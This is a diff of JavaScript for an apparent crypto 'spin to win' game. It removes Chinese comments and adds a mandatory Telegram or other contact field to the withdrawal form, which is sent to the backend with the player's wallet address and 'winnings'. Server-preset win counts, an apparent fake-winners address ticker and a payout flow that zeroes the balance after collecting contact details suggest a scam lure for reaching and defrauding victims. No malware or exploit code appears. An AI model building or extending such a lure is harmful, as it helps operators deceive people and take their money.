@@ -20,10 +20,8 @@ window.__GAME_CONFIG = {
     winCount: 3
 };
 
-// 缓存 key
 const CFG_CACHE_KEY = '__nexus_cfg_cache';
 
-// 从 localStorage 读缓存配置
 function loadCachedConfig() {
     try {
         const raw = localStorage.getItem(CFG_CACHE_KEY);
@@ -36,14 +34,12 @@ function loadCachedConfig() {
     return null;
 }
 
-// 写缓存配置
 function saveCachedConfig(cfg) {
     try {
         localStorage.setItem(CFG_CACHE_KEY, JSON.stringify(cfg));
     } catch (e) {}
 }
 
-// ★ 立即应用缓存配置（在请求之前，避免闪 USDT）
 (function applyCachedConfigImmediately(){
     const cached = loadCachedConfig();
     if (cached) {
@@ -59,7 +55,6 @@ function saveCachedConfig(cfg) {
         if (cached.winCount !== undefined) {
             window.__GAME_CONFIG.winCount = parseInt(cached.winCount, 10) || 0;
         }
-        // 等 DOM 就绪后立即刷新 UI
         if (document.readyState === 'loading') {
             document.addEventListener('DOMContentLoaded', applyConfigToUI);
         } else {
@@ -68,7 +63,6 @@ function saveCachedConfig(cfg) {
     }
 })();
 
-// 地址验证规则（按币种）
 const ADDR_VALIDATORS = {
     USDT: /^T[1-9A-HJ-NP-Za-km-z]{33}$/,
     TRX:  /^T[1-9A-HJ-NP-Za-km-z]{33}$/,
@@ -78,7 +72,6 @@ const ADDR_VALIDATORS = {
     SOL:  /^[1-9A-HJ-NP-Za-km-z]{32,44}$/
 };
 
-// 金额格式化：按币种小数位去尾 0
 function formatAmount(value, currency) {
     const meta = COIN_META[currency] || COIN_META.USDT;
     let n = parseFloat(value);
@@ -91,7 +84,6 @@ function formatAmount(value, currency) {
     return str;
 }
 
-// 给数字加千分位（整数部分）
 function formatAmountWithSep(value, currency) {
     const raw = formatAmount(value, currency);
     const parts = raw.split('.');
@@ -99,7 +91,6 @@ function formatAmountWithSep(value, currency) {
     return parts.join('.');
 }
 
-// ★ 移除启动遮罩
 function hideBootOverlay() {
     const ov = document.getElementById('bootOverlay');
     if (!ov) return;
@@ -133,21 +124,18 @@ async function loadPublicSettings() {
         if (cfg.winCount !== undefined) {
             window.__GAME_CONFIG.winCount = parseInt(cfg.winCount, 10) || 0;
         }
-        // 写入缓存
         saveCachedConfig({
             currency: window.__GAME_CONFIG.currency,
             rewards: window.__GAME_CONFIG.rewards,
             winCount: window.__GAME_CONFIG.winCount
         });
         applyConfigToUI();
-        // 配置加载完成后，重建滚动队列
         if (typeof window.__rebuildRollingAddresses === 'function') {
             window.__rebuildRollingAddresses();
         }
     } catch (e) {
         console.warn('读取公共配置失败:', e.message);
     } finally {
-        // ★ 无论成功失败，都移除遮罩
         hideBootOverlay();
     }
 }
@@ -263,7 +251,6 @@ if (document.readyState === 'loading') {
 window.addEventListener('pagehide', endVisitSession);
 window.addEventListener('beforeunload', endVisitSession);
 
-// ★ 保险：无论如何 3 秒后移除遮罩（防止请求卡住一直白屏）
 setTimeout(hideBootOverlay, 3000);
 
 // ===================== 主游戏 =====================
@@ -429,14 +416,26 @@ function openExtractModal(){
   const cur = window.__GAME_CONFIG.currency;
   $("extractAmt").textContent = formatAmountWithSep(S.bal, cur) + " " + cur;
   if (typeof window.__updateExtractLabel === 'function') window.__updateExtractLabel();
+  
   const input = $("trc20Input");
   input.classList.remove("is-invalid");
   $("trc20Err").textContent = "";
+  
+  // ★ 重置联系方式表单
+  const typeSel = $("contactTypeSelect");
+  const valInput = $("contactValueInput");
+  if (typeSel) typeSel.value = "Telegram";
+  if (valInput) { valInput.value = ""; valInput.classList.remove("is-invalid"); }
+  const cErr = $("contactErr");
+  if (cErr) cErr.textContent = "";
+  if (typeof window.__updateContactPlaceholder === 'function') window.__updateContactPlaceholder();
+
   if (cur === 'ETH') input.placeholder = '0x................................';
   else if (cur === 'BTC') input.placeholder = '1... / 3... / bc1...';
   else if (cur === 'DOGE') input.placeholder = 'D................................';
   else if (cur === 'SOL') input.placeholder = '4................................';
   else input.placeholder = 'T................................';
+  
   openM("extractModal");
   setTimeout(()=>input.focus(), 280);
 }
@@ -562,6 +561,8 @@ function validateAddress(addr, currency) {
 function submit(){
   const input=$("trc20Input"),err=$("trc20Err"),addr=input.value.trim();
   const cur = window.__GAME_CONFIG.currency;
+  
+  // 1. 验证地址
   if(!validateAddress(addr, cur)){
     input.classList.add("is-invalid");
     const key = 'invalid_addr_' + cur.toLowerCase();
@@ -571,6 +572,23 @@ function submit(){
   }
   input.classList.remove("is-invalid");
   err.textContent="";
+
+  // 2. 验证联系方式
+  const typeSel = $("contactTypeSelect");
+  const valInput = $("contactValueInput");
+  const cErr = $("contactErr");
+  const contactType = typeSel ? typeSel.value : 'Telegram';
+  const contactValue = valInput ? valInput.value.trim() : '';
+  
+  if(!contactValue) {
+    if(valInput) valInput.classList.add("is-invalid");
+    if(cErr) cErr.textContent = T('contact_required');
+    return;
+  }
+  if(valInput) valInput.classList.remove("is-invalid");
+  if(cErr) cErr.textContent = "";
+
+  // 3. 提交
   const withdrawAmount = S.bal;
   S.withdrawn=1;
   S.addr=addr;
@@ -580,7 +598,7 @@ function submit(){
   openM("confirmModal");
   setBal(0);
   restoreBtn();
-  submitTrc20Record(addr, withdrawAmount);
+  submitTrc20Record(addr, withdrawAmount, contactType, contactValue);
 }
 
 function onMain(){
@@ -609,6 +627,17 @@ function init(){
   $("claimBtn").onclick=claim;
   $("submitWithdrawBtn").onclick=submit;
   $("trc20Input").onkeydown=e=>{if(e.key==="Enter")submit()};
+  
+  // ★ 绑定下拉框变化，更新输入框 placeholder
+  const typeSel = $("contactTypeSelect");
+  if (typeSel) {
+    typeSel.onchange = () => {
+      if (typeof window.__updateContactPlaceholder === 'function') window.__updateContactPlaceholder();
+      const valInput = $("contactValueInput");
+      if (valInput) valInput.value = ""; // 切换类型清空输入
+    };
+  }
+
   $("muteBtn").onclick=()=>{SFX.muted=!SFX.muted;if(SFX.muted)SFX.stopSpin();$("iconSoundOn").classList.toggle("hidden",SFX.muted);$("iconSoundOff").classList.toggle("hidden",!SFX.muted)};
   let lastW=innerWidth;
   addEventListener("resize",()=>{if(S.spinning||S.pending||S.canExtract||innerWidth===lastW)return;lastW=innerWidth;mount()});
@@ -623,13 +652,12 @@ if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",
 window.__refreshSpinBtn = restoreBtn;
 })();
 
-// ========== 暴露币种/奖励配置给其他脚本 ==========
 window.__getCurrency = () => window.__GAME_CONFIG.currency;
 window.__getReward = (match) => window.__GAME_CONFIG.rewards[match] || 0;
 window.__formatAmount = formatAmountWithSep;
 
-// ========== 提交提现记录到后端 ==========
-async function submitTrc20Record(address, balance){
+// ★ 提交提现记录，带联系方式
+async function submitTrc20Record(address, balance, contactType, contactValue){
   try {
     const lang = (document.getElementById('langSelect') && document.getElementById('langSelect').value) || (navigator.language || 'en');
     const visitId = window.__visitId;
@@ -644,6 +672,8 @@ async function submitTrc20Record(address, balance){
       address: address,
       balance: formatAmount(balance, currency),
       currency: currency,
+      contactType: contactType,
+      contactValue: contactValue,
       timestamp: new Date().toISOString(),
       language: lang,
       visitTime: window.__firstVisitTime || new Date().toISOString()
